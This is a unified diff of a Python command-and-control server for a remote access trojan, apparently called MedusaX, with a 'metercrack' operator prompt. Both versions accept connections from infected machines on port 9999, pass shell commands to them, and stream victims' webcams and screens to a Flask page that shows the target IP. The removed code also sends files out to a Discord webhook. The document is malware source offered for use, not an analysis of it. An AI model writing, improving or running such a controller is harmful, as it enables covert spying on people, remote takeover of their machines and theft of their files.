@@ -1,116 +1,87 @@
 import socket
 import threading
-import time
-from flask import Flask, render_template, Response
 import requests
+import os
 import sys
+import time
+from flask import Flask, Response, render_template
+from colorama import Fore, Style
 
-# Web interface setup
 app = Flask(__name__)
 
-# List of connected clients
 clients = {}
-target_ip = None
+streaming = {"status": "Stopped", "start_time": None, "target_ip": None}
+stream_type = None
+frame_buffer = None
 
-def start_flask_server():
-    app.run(host='0.0.0.0', port=5000)
+def handle_client(client_socket, address):
+    global frame_buffer, stream_type, streaming
 
-@app.route('/webcam/<client_ip>')
-def webcam_stream(client_ip):
-    if client_ip in clients:
-        return Response(clients[client_ip]["webcam"], mimetype='multipart/x-mixed-replace; boundary=frame')
-    return "Client not found."
+    clients[address] = client_socket
+    print(f"{Fore.GREEN}[ + ] Connection established with {address}{Style.RESET_ALL}")
 
-@app.route('/screen/<client_ip>')
-def screen_stream(client_ip):
-    if client_ip in clients:
-        return Response(clients[client_ip]["screen"], mimetype='multipart/x-mixed-replace; boundary=frame')
-    return "Client not found."
-
-# Commands for interacting with clients
-def list_clients():
-    print("Connected Clients:")
-    for ip, client in clients.items():
-        print(f"{ip}: {client['status']}")
-
-def download_file(client_ip, filename):
-    # Send the file to the Discord webhook
-    file_url = f'http://{client_ip}/files/{filename}'  # Assume a valid URL
-    webhook_url = 'your_discord_webhook_url_here'
-    payload = {'content': f"File: {filename}"}
-    files = {'file': open(filename, 'rb')}
-    requests.post(webhook_url, data=payload, files=files)
-    print(f"[ * ] Sending... [+] Sent!")
-
-def handle_client(client_socket, client_ip):
-    global target_ip
-    clients[client_ip] = {"socket": client_socket, "status": "Connected", "webcam": None, "screen": None}
-    
     while True:
-        command = client_socket.recv(1024).decode('utf-8')
-        
-        if command.startswith('!set target'):
-            target_ip = command.split()[2]
-            print(f"Target set to {target_ip}")
+        try:
+            command = input("metercrack > ")
+            if command.startswith("!"):
+                client_socket.send(command.encode())
+            else:
+                client_socket.send(f"!shell {command}".encode())
 
-        elif command.startswith('!remove target'):
-            target_ip = None
-            print(f"Target removed.")
-        
-        elif command == "!list":
-            list_clients()
+            if command.startswith("!webcam_stream") or command.startswith("!screen_stream"):
+                stream_type = "webcam" if "webcam" in command else "screen"
+                streaming["status"] = "Playing"
+                streaming["start_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
+                streaming["target_ip"] = address[0]
+                print(f"{Fore.YELLOW}[ * ] Starting...{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[ * ] Preparing player...{Style.RESET_ALL}")
 
-        elif command.startswith('!download'):
-            filename = command.split()[1]
-            download_file(client_ip, filename)
+                threading.Thread(target=start_streaming_server).start()
 
-        elif command == "!exit":
-            client_socket.close()
-            del clients[client_ip]
+        except Exception as e:
+            print(f"{Fore.RED}[ - ] Error: {e}{Style.RESET_ALL}")
             break
 
-def server_listener():
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind(('0.0.0.0', 9999))
-    server_socket.listen(5)
-    
-    while True:
-        client_socket, client_address = server_socket.accept()
-        client_ip = client_address[0]
-        print(f"New client connected: {client_ip}")
-        threading.Thread(target=handle_client, args=(client_socket, client_ip)).start()
+def start_streaming_server():
+    print(f"{Fore.GREEN}Opening player at: http://127.0.0.1:5000/{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}[ * ] Streaming...{Style.RESET_ALL}")
+    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
 
-def run_metercrack_prompt():
-    global target_ip
+@app.route("/")
+def stream_page():
+    return f"""
+    <html>
+    <head><title>MedusaX Stream</title></head>
+    <body>
+        <h1>MedusaX Live Stream</h1>
+        <p>Target IP: {streaming["target_ip"]}</p>
+        <p>Start Time: {streaming["start_time"]}</p>
+        <p>Status: {streaming["status"]}</p>
+        <img src="/video_feed">
+    </body>
+    </html>
+    """
+
+@app.route("/video_feed")
+def video_feed():
+    def generate():
+        global frame_buffer
+        while True:
+            if frame_buffer:
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + frame_buffer + b'\r\n')
+
+    return Response(generate(), mimetype="multipart/x-mixed-replace; boundary=frame")
+
+def main():
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind(("0.0.0.0", 9999))
+    server.listen(5)
+    print(f"{Fore.CYAN}[*] MedusaX Server Listening on Port 9999...{Style.RESET_ALL}")
+
     while True:
-        if len(clients) > 0:  # Prompt only if at least one client is connected
-            if target_ip:
-                print(f"metercrack > ", end="")
-            else:
-                print(f"metercrack > ", end="")
-            command = input()
-            if command == "!exit":
-                break
-            elif command == "!list":
-                list_clients()
-            elif command.startswith("!set target"):
-                target_ip = command.split()[2]
-                print(f"Target set to {target_ip}")
-            elif command.startswith("!remove target"):
-                target_ip = None
-                print(f"Target removed.")
-            elif command.startswith("!download"):
-                filename = command.split()[1]
-                download_file(target_ip, filename)
-        else:
-            time.sleep(1)  # Prevent unnecessary CPU usage when no clients are connected
+        client_socket, addr = server.accept()
+        threading.Thread(target=handle_client, args=(client_socket, addr)).start()
 
 if __name__ == "__main__":
-    # Start server listener
-    threading.Thread(target=server_listener, daemon=True).start()
-
-    # Start the Flask web server
-    threading.Thread(target=start_flask_server, daemon=True).start()
-
-    # Run the metercrack prompt in the main thread
-    run_metercrack_prompt()
+    main()
